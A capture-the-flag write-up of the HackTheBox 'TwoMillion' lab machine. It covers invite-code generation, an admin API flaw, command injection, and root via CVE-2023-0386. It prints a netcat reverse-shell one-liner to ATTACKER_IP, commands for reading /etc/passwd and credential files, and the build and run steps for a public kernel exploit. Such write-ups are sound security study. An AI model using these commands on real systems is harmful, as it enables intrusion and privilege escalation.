# TwoMillion

**Difficulty:** 🟢 Easy · **Room:** [HackTheBox](https://app.hackthebox.com/machines/TwoMillion)

---

## Reconnaissance

I started with an `nmap` scan to map out the attack surface. I used `-sV` to check the version of the running service and `-sC` to run the default set of discovery and vulnerability scripts. These were the results:

![](nmap.png)

The machine had two ports open. The first was port `22`, with `ssh` running on it. It used the `OpenSSH 8.9p1` version. The second service was `http`, running on port `80`. Nmap revealed that the page name for the given IP was `2million.htb`. I added this to `/etc/hosts`. Next, I visited the page, which was a HackTheBox page about Penetration Testing Labs:

![](page.png)

The page contained a couple of navigation buttons. The `login` button redirected me to the login page. I tested if the E-mail and password fields were vulnerable to `SQLi`. Next, I checked the `[join]` section. It contained a button redirecting to the `/invite` endpoint:

![](invite_endpoint.png)

---

## Logging in

In order to sign up, I had to provide the invite code. The field didn't have a placeholder, so I didn't know what the format of the code was. I viewed the page source and found that it used a script named `inviteapi.min.js`:

![](inviteapi_page_source.png)

The name of the script suggested that it may be responsible for generating the code required for signing up. I checked the content of the script and noticed that it was obfuscated. The beginning of the code, i.e. `eval(function(p,a,c,k,e,d)`, revealed that [Dean Edwards Packer](https://github.com/evanw/packer) was used to obfuscate the script, since it's typical for this tool to begin a script like this. I deobfuscated the script using [this](https://tools.webuddha.com/jsPackerUnpack/) tool:

![](deobfuscated_js.png)

The code revealed that the `/api/v1/invite/how/to/generate` endpoint existed. However, it was only accessible through the `POST` method. I checked the content of the page:

![](how_to_generate.png)

The page contained ROT13-encrypted text. I decrypted it using [CyberChef](https://gchq.github.io/CyberChef/):

```text
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

I made a `POST` request to the given endpoint and achieved the invite code:

![](invite_generate_code.png)

The format of the code suggested that it was encoded with `Base64`. I decoded it and used it to sign in. The code was accepted, and I could create an account and log in to the portal:

![](portal_login.png)

---

## Initial Access

After successfully logging in, I searched the portal, looking for a possible way to get into the system. I navigated to the `/access` endpoint, which contained information about accessing the lab:

![](access.png)

From there, I could download the VPN config. The file was downloaded from `/api/v1/user/vpn/generate`. I checked whether `/api/v1` had any interesting information. And it did:

![](api_endpoints.png)

It contained a list of all API endpoints, as well as those reserved for admins. The `/api/v1/admin/settings/update` endpoint is used to update user settings. I checked if I could access this endpoint without being an admin. I captured the request using Burp Suite and changed the HTTP method to `PUT`:

![](update_user.png)

Looking at the response, it didn't say that I had to be an admin to use this function. I started to use this functionality to try to modify my account. First, I added the `Content-Type: application/json` header and some JSON data:

![](updating_user1.png)

I had to provide an email instead of a username. I sent another request:

![](updating_user2.png)

This time, I had to provide the `is_admin` parameter. I did this and updated my account privileges:

![](user_updated_admin.png)

Next, I decided to use the `/admin/vpn/generate` API method since I was an admin from now on. I had to use the `POST` method for it to work. I sent the username for which I wanted to generate a config in the `username` parameter:

![](vpn_config.png)

I checked if the `username` parameter was vulnerable to `Command Injection` because the VPN config was probably generated via a Linux command:

![](ci_test.png)

There wasn't any text in the response, but this didn't mean that there wasn't `Command Injection`. I sent another request, this time with a reverse shell, and received the connection:

![](HackTheBox/Red%20Team/TwoMillion/images/reverse_shell.png)

Reverse shell used:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

---

## Privilege escalation: `admin`

After receiving the connection, I checked for accounts I could escalate to:

```bash
cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash
```

I listed all the files that the `admin` user owned:

```bash
find / -type f -user admin 2>/dev/null
/home/admin/.profile
/home/admin/.bash_logout
/home/admin/.bashrc
/var/mail/admin
```

The most interesting result was `/var/mail/admin`. I read the contents of this file:

```text
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

So, the sender of the email asks the admin to update the OS because of Linux kernel CVEs. The one he is worried about the most is one in OverlayFS / FUSE, which refers to `CVE-2023-0386`, found in March 2023. I checked the machine's kernel version using `uname -r`, which was `5.15.70`. So, this machine is vulnerable to this CVE because it affects versions from `5.11` up to `5.15.91`. Before trying to exploit this vulnerability, I listed all the files with `ls -a` and saw a `.env` file. I read its contents, and it contained the `admin` database password:

![](HackTheBox/Red%20Team/TwoMillion/images/admin_pass.png)

I tried using this password via `ssh`, and it worked, so I obtained the first flag:

![](HackTheBox/Red%20Team/TwoMillion/images/flag1.png)

---

## Privilege escalation: `root`

To exploit this CVE, I followed [these](https://github.com/sxlmnwb/CVE-2023-0386) instructions. First, I cloned the repository:

```bash
git clone https://github.com/sxlmnwb/CVE-2023-0386
```

Next, I copied each file to the `admin` account:

```bash
scp /file admin@MACHINE_IP:/home/admin
```

I compiled each binary:

```bash
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
```

On the first terminal, I ran:

```bash
./fuse ./ovlcap/lower ./gc
```

On the second:

```bash
./exp
```

After that, I became root and got the second flag:

![](flag2.png)

---

## Kill chain

It all started with the `inviteapi.min.js` script being visible to anyone. Thanks to that, I could generate my invite code and log in to the portal. Next, the `/api/v1` endpoint revealed all the API methods available. The `/api/v1/admin/settings/update` endpoint didn't check if the request came from an administrator, so I updated my role from user to administrator. Next, the `/api/v1/vpn/generate` method was vulnerable to `Command Injection`, which resulted in obtaining the reverse shell. Next, the `admin` credentials were stored in the `.env` file, which allowed me to log in via `ssh`, and the system was vulnerable to `CVE-2023-0386`, which allowed me to get access to the root account.

> Thanks for reading!